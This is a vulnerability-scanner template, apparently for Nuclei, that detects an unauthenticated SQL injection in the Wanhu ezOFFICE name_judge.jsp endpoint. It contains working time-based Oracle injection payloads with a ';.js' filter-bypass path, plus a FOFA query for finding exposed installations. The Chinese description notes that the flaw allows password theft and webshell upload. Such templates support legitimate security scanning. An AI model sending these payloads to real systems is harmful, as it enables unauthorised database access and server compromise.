http:
    - matchers:
        - dsl:
            - status_code==200 && duration_1>=4 && duration_1<=5 && duration_2>=8 && duration_2<=9
          name: SQL注入
          type: dsl
      raw:
        - |
          POST /defaultroot/modules/govoffice/custom_documentmanager/name_judge.jsp;.js HTTP/1.1
          Host: {{Hostname}}
          Content-Type: application/x-www-form-urlencoded; charset=utf-8

          formType=1+AND+1337=DBMS_PIPE.RECEIVE_MESSAGE('any',4)--&govFormName=&formId=
        - |
          POST /defaultroot/modules/govoffice/custom_documentmanager/name_judge.jsp;.js HTTP/1.1
          Host: {{Hostname}}
          Content-Type: application/x-www-form-urlencoded; charset=utf-8

          formType=1+AND+1337=DBMS_PIPE.RECEIVE_MESSAGE('any',8)--&govFormName=&formId=
id: Wanhu-ezOFFICE-name_judge-SQL
info:
    author: HuanXiong
    description: |-
        fofa: app="万户ezOFFICE协同管理平台"
        万户 ezOFFICE name_judge.jsp 接口处存在SQL注入漏洞，未经身份验证的远程攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。
    name: 万户 ezoffice协同办公系统 name_judge.jsp SQL注入
    reference:
        - null
    severity: high
    tags:
        - 协同办公系统
